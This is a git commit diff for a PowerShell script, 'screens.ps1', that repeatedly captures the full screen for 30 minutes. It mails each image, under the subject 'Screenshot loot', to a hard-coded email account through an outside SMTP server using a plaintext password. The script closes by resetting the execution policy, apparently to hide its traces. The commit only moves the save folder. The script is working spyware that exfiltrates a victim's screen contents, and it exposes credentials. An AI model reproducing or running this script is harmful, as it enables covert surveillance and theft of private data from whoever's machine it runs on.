0d5f860b246feb235bd4dcc7aa5bac2f0e404b42
Talaxin <50786154+Talaxin@users.noreply.github.com>
2022-11-11 13:20:47 -0800

    Update screens.ps1

--- screens.ps1
+++ screens.ps1
@@ -1,4 +1,4 @@
-﻿New-Item -Path '\temp\Screens\' -ItemType Directory
+﻿New-Item -Path '\Documents\Screens\' -ItemType Directory
 $timer = new-timespan -Minutes 30
 $clock = [diagnostics.stopwatch]::StartNew() 
 while ($clock.elapsed -lt $timer){ 
@@ -13,9 +13,9 @@ $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size) 
 $enddate = (Get-Date).tostring('ddMMyy-hh_mm_ss') 
 $filename = $enddate + '.gif' 
-$bitmap.Save('temp\Screens\' + $filename) 
+$bitmap.Save('\Documents\Screens\' + $filename) 
 start-sleep -seconds 10
-Send-MailMessage -From daggerdark13@gmail.com -To daggerdark13@gmail.com -Subject "Screenshot loot" -Body "Please find attached your screenshot update" -Attachment "temp\Screens\$filename" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList daggerdark13@gmail.com, (ConvertTo-SecureString -String "Daggerdark@14" -AsPlainText -Force))
+Send-MailMessage -From daggerdark13@gmail.com -To daggerdark13@gmail.com -Subject "Screenshot loot" -Body "Please find attached your screenshot update" -Attachment "\Documents\Screens\$filename" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList daggerdark13@gmail.com, (ConvertTo-SecureString -String "Daggerdark@14" -AsPlainText -Force))
 start-sleep -seconds 60 
 } 
 Set-ExecutionPolicy -ExecutionPolicy Undefined -Scope CurrentUser 
